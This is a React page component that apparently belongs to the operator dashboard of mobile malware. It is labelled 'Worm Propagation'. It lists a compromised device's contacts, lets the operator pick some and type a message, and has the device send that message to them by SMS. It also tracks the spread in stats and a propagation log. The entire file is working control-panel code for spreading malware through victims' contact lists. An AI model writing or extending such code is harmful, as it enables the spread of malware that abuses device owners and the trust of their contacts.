import { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import PageHeader from '../components/PageHeader'
import DataTable from '../components/DataTable'
import { worm, contacts } from '../utils/api'
import { Worm, Send, MessageSquare } from 'lucide-react'

export default function WormPage() {
  const { deviceId } = useParams()
  const [logs, setLogs] = useState([])
  const [contactList, setContactList] = useState([])
  const [message, setMessage] = useState('')
  const [selectedContacts, setSelectedContacts] = useState([])

  useEffect(() => { if (deviceId) loadData() }, [deviceId])

  const loadData = async () => {
    const [l, c] = await Promise.all([worm.list(deviceId), contacts.list(deviceId)])
    if (l) setLogs(l)
    if (c) setContactList(c)
  }

  const handleSend = async () => {
    if (!selectedContacts.length || !message) return
    await worm.send(deviceId, {
      contacts: selectedContacts,
      message,
      via: 'sms'
    })
    setMessage('')
    setSelectedContacts([])
    loadData()
  }

  const columns = [
    { key: 'target_contact', label: 'Contact' },
    { key: 'message_body', label: 'Message', render: (row) => (
      <span className="text-xs text-wuzen-muted truncate max-w-[300px] block">{row.message_body}</span>
    )},
    { key: 'sent_via', label: 'Via' },
    { key: 'status', label: 'Status', render: (row) => (
      <span className={`text-xs px-2 py-0.5 rounded ${row.status === 'sent' ? 'bg-wuzen-success/10 text-wuzen-success' : 'bg-wuzen-warning/10 text-wuzen-warning'}`}>
        {row.status?.toUpperCase()}
      </span>
    )},
    { key: 'created_at', label: 'Time', render: (row) => (
      <span className="text-xs font-mono">{new Date(row.created_at).toLocaleString()}</span>
    )}
  ]

  return (
    <div className="animate-fade-in">
      <PageHeader title="Worm Propagation" icon={Worm} onDeviceChange={() => {}} />

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-6">
        <div className="lg:col-span-2 wuzen-panel p-6">
          <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-4">Send Worm Messages</h3>
          <div className="space-y-4">
            <div>
              <label className="text-xs text-wuzen-muted uppercase mb-1 block">Select Contacts</label>
              <div className="max-h-32 overflow-auto border border-wuzen-border rounded p-2 space-y-1">
                {contactList.map(c => (
                  <label key={c.id} className="flex items-center gap-2 text-sm cursor-pointer hover:bg-wuzen-card p-1 rounded">
                    <input 
                      type="checkbox" 
                      checked={selectedContacts.includes(c.display_name)}
                      onChange={e => {
                        if (e.target.checked) setSelectedContacts(p => [...p, c.display_name])
                        else setSelectedContacts(p => p.filter(x => x !== c.display_name))
                      }}
                      className="rounded"
                    />
                    <span>{c.display_name}</span>
                    <span className="text-xs text-wuzen-muted">{c.phone_numbers?.[0]}</span>
                  </label>
                ))}
              </div>
            </div>
            <div>
              <label className="text-xs text-wuzen-muted uppercase mb-1 block">Message</label>
              <textarea className="wuzen-input w-full h-20" value={message} onChange={e => setMessage(e.target.value)} placeholder="Enter message to propagate..." />
            </div>
            <button onClick={handleSend} className="wuzen-btn-danger">
              <Send className="w-4 h-4" /> SEND TO {selectedContacts.length} CONTACTS
            </button>
          </div>
        </div>

        <div className="wuzen-panel p-6">
          <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-4">Propagation Stats</h3>
          <div className="space-y-3">
            <div className="flex justify-between">
              <span className="text-xs text-wuzen-muted">Total Sent</span>
              <span className="font-mono text-wuzen-primary">{logs.filter(l => l.status === 'sent').length}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-xs text-wuzen-muted">Pending</span>
              <span className="font-mono text-wuzen-warning">{logs.filter(l => l.status === 'pending').length}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-xs text-wuzen-muted">Failed</span>
              <span className="font-mono text-wuzen-danger">{logs.filter(l => l.status === 'failed').length}</span>
            </div>
          </div>
        </div>
      </div>

      <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-3">Propagation Log</h3>
      <DataTable columns={columns} data={logs} keyField="id" searchable />
    </div>
  )
}
